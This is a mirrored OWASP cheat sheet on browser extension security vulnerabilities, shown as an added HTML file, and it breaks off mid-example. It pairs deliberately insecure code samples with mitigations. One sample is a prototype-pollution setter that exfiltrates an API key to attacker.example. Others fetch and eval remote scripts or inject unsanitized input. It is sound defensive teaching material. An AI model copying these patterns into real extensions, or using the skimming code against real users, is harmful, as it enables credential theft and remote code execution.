@@ -1,0 +1,234 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Browser Extension Vulnerabilities | Raw2Crawl</title><meta name="description" content="OWASP Cheat Sheet Series · Browser Extension Vulnerabilities">
+<link rel="canonical" href="https://raw2crawl.github.io/en/OWASP/CheatSheetSeries/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html"><link rel="icon" href="/assets/icon.svg" type="image/svg+xml">
+<meta name="color-scheme" content="light dark"><meta name="theme-color" content="#202020">
+<script>try{var t=localStorage.getItem('raw2crawl-theme');document.documentElement.dataset.theme=t==='light'||t==='dark'?t:matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}catch(e){document.documentElement.dataset.theme=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}</script>
+<link rel="stylesheet" href="/assets/site.css"><script src="/assets/site.js" defer></script>
+</head><body id="top" class="documentation series-document">
+<a class="skip-link" href="#main-content">Skip to content</a>
+<header class="site-header"><a class="brand" href="/en/">Raw2Crawl<span class="brand-divider" aria-hidden="true">/</span><span class="brand-label">Documentation</span></a>
+<div class="header-actions"><span class="language" aria-label="Language: English">EN</span><button id="theme-toggle" type="button" aria-label="Switch color theme">Theme</button></div></header>
+<div class="series-layout"><main id="main-content" class="reading-pane series-reading"><nav class="breadcrumbs" aria-label="Breadcrumb"><a href="/en/">Library</a><span>/</span><a href="/en/OWASP/">OWASP</a><span>/</span><a href="/en/OWASP/CheatSheetSeries/">Cheat Sheet Series</a></nav><article class="doc-content"><h1 id="browser-extension-security-vulnerabilities-cheat-sheet">Browser Extension Security Vulnerabilities Cheat Sheet<a class="headerlink" href="#browser-extension-security-vulnerabilities-cheat-sheet" title="Permanent link">&para;</a></h1>
+<h2 id="1-permissions-overreach">1. Permissions Overreach<a class="headerlink" href="#1-permissions-overreach" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-permissions-overreach">Vulnerability: Permissions Overreach<a class="headerlink" href="#vulnerability-permissions-overreach" title="Permanent link">&para;</a></h3>
+<p>Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.</p>
+<h3 id="example-permissions-overreach">Example: Permissions Overreach<a class="headerlink" href="#example-permissions-overreach" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"manifest_version"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"My Extension"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"permissions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">"tabs"</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">"storage"</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">"host_permissions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">"http://*/*"</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">"https://*/*"</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="mitigation-permissions-overreach">Mitigation: Permissions Overreach<a class="headerlink" href="#mitigation-permissions-overreach" title="Permanent link">&para;</a></h3>
+<p>Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed. In Manifest V3, declare URL access separately in <a href="https://developer.chrome.com/docs/extensions/develop/migrate/manifest#update-host-permissions"><code>host_permissions</code> or <code>optional_host_permissions</code></a>.</p>
+<h2 id="2-data-leakage">2. Data Leakage<a class="headerlink" href="#2-data-leakage" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-data-leakage">Vulnerability: Data Leakage<a class="headerlink" href="#vulnerability-data-leakage" title="Permanent link">&para;</a></h3>
+<p>Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.</p>
+<h3 id="example-data-leakage">Example: Data Leakage<a class="headerlink" href="#example-data-leakage" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">onUpdated</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">tabId</span><span class="p">,</span><span class="w"> </span><span class="nx">changeInfo</span><span class="p">,</span><span class="w"> </span><span class="nx">tab</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">changeInfo</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'complete'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'http://example.com/track'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+<span class="w">      </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">URL</span><span class="o">:</span><span class="w"> </span><span class="nx">tab</span><span class="p">.</span><span class="nx">URL</span><span class="w"> </span><span class="p">})</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div>
+<h3 id="mitigation-data-leakage">Mitigation: Data Leakage<a class="headerlink" href="#mitigation-data-leakage" title="Permanent link">&para;</a></h3>
+<p>Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.</p>
+<h2 id="3-cross-site-scripting-xss">3. Cross-Site Scripting (XSS)<a class="headerlink" href="#3-cross-site-scripting-xss" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-cross-site-scripting-xss">Vulnerability: Cross-Site Scripting (XSS)<a class="headerlink" href="#vulnerability-cross-site-scripting-xss" title="Permanent link">&para;</a></h3>
+<p>If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.</p>
+<h3 id="example-cross-site-scripting-xss">Example: Cross-Site Scripting (XSS)<a class="headerlink" href="#example-cross-site-scripting-xss" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">userInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'input'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'output'</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">userInput</span><span class="p">;</span><span class="w"> </span><span class="c1">// No sanitization</span>
+</code></pre></div>
+<h3 id="mitigation-cross-site-scripting-xss">Mitigation: Cross-Site Scripting (XSS)<a class="headerlink" href="#mitigation-cross-site-scripting-xss" title="Permanent link">&para;</a></h3>
+<p>Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.</p>
+<h2 id="4-insecure-communication">4. Insecure Communication<a class="headerlink" href="#4-insecure-communication" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-insecure-communication">Vulnerability: Insecure Communication<a class="headerlink" href="#vulnerability-insecure-communication" title="Permanent link">&para;</a></h3>
+<p>Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.</p>
+<h3 id="example-insecure-communication">Example: Insecure Communication<a class="headerlink" href="#example-insecure-communication" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'http://example.com/api/data'</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="mitigation-insecure-communication">Mitigation: Insecure Communication<a class="headerlink" href="#mitigation-insecure-communication" title="Permanent link">&para;</a></h3>
+<p>Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.</p>
+<h2 id="5-code-injection">5. Code Injection<a class="headerlink" href="#5-code-injection" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-code-injection">Vulnerability: Code Injection<a class="headerlink" href="#vulnerability-code-injection" title="Permanent link">&para;</a></h3>
+<p>An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.</p>
+<h3 id="example-code-injection">Example: Code Injection<a class="headerlink" href="#example-code-injection" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'script'</span><span class="p">);</span>
+<span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://example.com/malicious.js'</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="mitigation-code-injection">Mitigation: Code Injection<a class="headerlink" href="#mitigation-code-injection" title="Permanent link">&para;</a></h3>
+<p>Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the <a href="/en/OWASP/CheatSheetSeries/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">CSP Cheat Sheet</a>. Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.</p>
+<h2 id="6-malicious-updates">6. Malicious Updates<a class="headerlink" href="#6-malicious-updates" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-malicious-updates">Vulnerability: Malicious Updates<a class="headerlink" href="#vulnerability-malicious-updates" title="Permanent link">&para;</a></h3>
+<p>If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.</p>
+<h3 id="example-malicious-updates">Example: Malicious Updates<a class="headerlink" href="#example-malicious-updates" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onInstalled</span><span class="p">.</span><span class="nx">addListener</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'http://example.com/update-script.js'</span><span class="p">)</span>
+<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nb">eval</span><span class="p">);</span><span class="w"> </span><span class="c1">// Unsafe!</span>
+<span class="p">});</span>
+</code></pre></div>
+<h3 id="mitigation-malicious-updates">Mitigation: Malicious Updates<a class="headerlink" href="#mitigation-malicious-updates" title="Permanent link">&para;</a></h3>
+<p>Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
+See <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices">"Don’t inject or incorporate remote scripts"</a>.
+Implement integrity checks before executing any fetched code.</p>
+<h2 id="7-third-party-dependencies">7. Third-Party Dependencies<a class="headerlink" href="#7-third-party-dependencies" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-third-party-dependencies">Vulnerability: Third-Party Dependencies<a class="headerlink" href="#vulnerability-third-party-dependencies" title="Permanent link">&para;</a></h3>
+<p>Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.</p>
+<h3 id="example-third-party-dependencies">Example: Third-Party Dependencies<a class="headerlink" href="#example-third-party-dependencies" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">"vulnerable-lib"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="mitigation-third-party-dependencies">Mitigation: Third-Party Dependencies<a class="headerlink" href="#mitigation-third-party-dependencies" title="Permanent link">&para;</a></h3>
+<p>Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.</p>
+<h2 id="8-lack-of-content-security-policy-csp">8. Lack of Content Security Policy (CSP)<a class="headerlink" href="#8-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-lack-of-content-security-policy-csp">Vulnerability: Lack of Content Security Policy (CSP)<a class="headerlink" href="#vulnerability-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h3>
+<p>Weakening an extension’s Content Security Policy (CSP) can increase the impact of script injection. <a href="https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy">Chrome enforces a default and minimum CSP for Manifest V3 extension pages</a>, even when the manifest omits a custom policy.</p>
+<h3 id="example-restrictive-manifest-v3-policy">Example: Restrictive Manifest V3 Policy<a class="headerlink" href="#example-restrictive-manifest-v3-policy" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"manifest_version"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"My Extension"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"content_security_policy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">"extension_pages"</span><span class="p">:</span><span class="w"> </span><span class="s2">"default-src 'self'; script-src 'self'; object-src 'none';"</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="mitigation-lack-of-content-security-policy-csp">Mitigation: Lack of Content Security Policy (CSP)<a class="headerlink" href="#mitigation-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h3>
+<p>Configure <code>content_security_policy.extension_pages</code> in <code>manifest.json</code> and load scripts from the extension package. Do not apply ordinary webpage nonce or hash recommendations to Chrome Manifest V3 extension pages: their <a href="https://developer.chrome.com/docs/extensions/develop/migrate/improve-security#remove-unsupported-csv">allowed script sources are restricted</a>. Keep inline script execution blocked and restrict other resource types to those the extension needs.</p>
+<h2 id="9-insecure-storage">9. Insecure Storage<a class="headerlink" href="#9-insecure-storage" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-insecure-storage">Vulnerability: Insecure Storage<a class="headerlink" href="#vulnerability-insecure-storage" title="Permanent link">&para;</a></h3>
+<p>Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.</p>
+<h3 id="example-insecure-storage">Example: Insecure Storage<a class="headerlink" href="#example-insecure-storage" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">'token'</span><span class="p">,</span><span class="w"> </span><span class="s1">'my-secret-token'</span><span class="p">);</span><span class="w"> </span><span class="c1">// No encryption</span>
+</code></pre></div>
+<h3 id="mitigation-insecure-storage">Mitigation: Insecure Storage<a class="headerlink" href="#mitigation-insecure-storage" title="Permanent link">&para;</a></h3>
+<p>Avoid persisting sensitive user data in the extension: <a href="https://developer.chrome.com/docs/extensions/develop/security-privacy/user-privacy#data_collection">extension storage is not encrypted</a>. For sensitive data needed only while the browser is running, use <a href="https://developer.chrome.com/docs/extensions/reference/api/storage#storage_areas"><code>chrome.storage.session</code></a>, which stores data in memory and is not exposed to content scripts by default. Keep that access restriction and clear data when it is no longer needed. This reduces persistence and content-script exposure; it does not protect secrets from a compromised extension or device.
+Never hardcode API keys or credentials within the extension code.</p>
+<h2 id="10-insufficient-privacy-controls">10. Insufficient Privacy Controls<a class="headerlink" href="#10-insufficient-privacy-controls" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-insufficient-privacy-controls">Vulnerability: Insufficient Privacy Controls<a class="headerlink" href="#vulnerability-insufficient-privacy-controls" title="Permanent link">&para;</a></h3>
+<p>If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.</p>
+<h3 id="example-insufficient-privacy-controls">Example: Insufficient Privacy Controls<a class="headerlink" href="#example-insufficient-privacy-controls" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"manifest_version"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"My Extension"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A cool extension with no privacy policy."</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="mitigation-insufficient-privacy-controls">Mitigation: Insufficient Privacy Controls<a class="headerlink" href="#mitigation-insufficient-privacy-controls" title="Permanent link">&para;</a></h3>
+<p>Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.</p>
+<h2 id="11-dom-based-data-skimming">11. DOM-based Data Skimming<a class="headerlink" href="#11-dom-based-data-skimming" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-dom-based-data-skimming">Vulnerability: DOM-based Data Skimming<a class="headerlink" href="#vulnerability-dom-based-data-skimming" title="Permanent link">&para;</a></h3>
+<p>When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.</p>
+<p>This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.</p>
+<p>A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.</p>
+<h3 id="example-dom-based-data-skimming">Example: DOM-based Data Skimming<a class="headerlink" href="#example-dom-based-data-skimming" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// content-script.js</span>
+
+<span class="c1">// Sensitive data fetched from the extension's background service</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">userData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"Jane Doe"</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="s2">"jane.doe@example.com"</span>
+<span class="p">};</span>
+
+<span class="c1">// This injects sensitive data directly into the page's DOM</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">userInfoDiv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'div'</span><span class="p">);</span>
+<span class="nx">userInfoDiv</span><span class="p">.</span><span class="nx">innerText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`name: </span><span class="si">${</span><span class="nx">userData</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">, email: </span><span class="si">${</span><span class="nx">userData</span><span class="p">.</span><span class="nx">email</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">userInfoDiv</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="mitigation-dom-based-data-skimming">Mitigation: DOM-based Data Skimming<a class="headerlink" href="#mitigation-dom-based-data-skimming" title="Permanent link">&para;</a></h3>
+<p>Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.</p>
+<p>Use secure alternatives such as:</p>
+<ul>
+<li>Popup: Display information in a popup UI that appears when the user clicks the extension's icon.</li>
+<li>Options Page: Use a dedicated options page for displaying user-specific data or settings.</li>
+<li>Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)</li>
+</ul>
+<p>It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot"><code>openOrClosedShadowRoot()</code> API</a>.</p>
+<p>Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.</p>
+<h2 id="12-prototype-based-data-skimming">12. Prototype-based Data Skimming<a class="headerlink" href="#12-prototype-based-data-skimming" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-prototype-based-data-skimming">Vulnerability: Prototype-based Data Skimming<a class="headerlink" href="#vulnerability-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
+<p>An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a <code>&lt;script&gt;</code> tag directly to DOM with <code>src</code> attribute pointing to a script of <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources">web accessible resources</a>.</p>
+<p>When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.</p>
+<p>The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.</p>
+<p>This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.</p>
+<h3 id="example-prototype-based-data-skimming">Example: Prototype-based Data Skimming<a class="headerlink" href="#example-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// Malicious script overwriting all objects' setter for 'apiKey'</span>
+<span class="c1">// to send the value to be set towards a server.</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span><span class="w"> </span><span class="s1">'apiKey'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`https://attacker.example?data=</span><span class="si">${</span><span class="nx">str</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="w">        </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="s1">'apiKey'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">str</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">})</span>
+
+<span class="c1">// Extension's script to be executed on a web page's context.</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'message'</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">apiKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// the setter for 'apiKey' is already polluted,</span>
+<span class="w">    </span><span class="c1">// and the below line triggers malicious code and the data is immediately sent.</span>
+<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">apiController</span><span class="p">.</span><span class="nx">apiKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">apiKey</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div>
+<h3 id="mitigation-prototype-based-data-skimming">Mitigation: Prototype-based Data Skimming<a class="headerlink" href="#mitigation-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
+<p>Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use <code>window.postMessage</code>, because it can be overwritten also and malicious scripts can add listeners for <code>message</code> event.</p>
+<p>Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.</p>
+<p>Also, please don't assume your extension's script can use native prototypes even if it's executed at <code>document_start</code> timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at <code>document_start</code> (<a href="https://issues.chromium.org/issues/40202434">official bug issue</a>).</p>
+<h2 id="13-insecure-message-passing">13. Insecure Message Passing<a class="headerlink" href="#13-insecure-message-passing" title="Permanent link">&para;</a></h2>
+<h3 id="vulnerability-insecure-message-passing">Vulnerability: Insecure Message Passing<a class="headerlink" href="#vulnerability-insecure-message-passing" title="Permanent link">&para;</a></h3>
+<p>Browser extensions often rely on message passing (<code>chrome.runtime.sendMessage/onMessage</code>) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys).</p>
+<h3 id="example-insecure-message-passing">Example: Insecure Message Passing<a class="headerlink" href="#example-insecure-message-passing" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// In Service Worker (Background)</span>
+<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">sendResponse</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">action</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'fetchSecret'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// No validation of sender</span>
+<span class="w">    </span><span class="c1">// A malicious content script/webpage could trigger this.</span>
+<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">SECRET_API_URL</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div>
+<h3 id="mitigation-insecure-message-passing">Mitigation: Insecure Message Passing<a class="headerlink" href="#mitigation-insecure-message-passing" title="Permanent link">&para;</a></h3>
+<p>Treat all incoming messages as untrusted input.
+In Service Workers, always:</p>
+<ul>
+<li>Validate <code>sender.id</code> to ensure the message originates from your own extension.</li>
+<li>Validate <code>sender.url</code> or <code>sender.origin</code> to restrict which extension pages or content scripts may communicate.</li>
+<li>Avoid allowing webpages to indirectly influence privileged logic through content scripts.</li>
+<li>Perform strict validation and allow-listing of <code>request.action</code> and all request parameters.</li>
+</ul>
+<p>Chrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">sendResponse</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">sender</span><span class="p">.</span><span class="nx">id</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
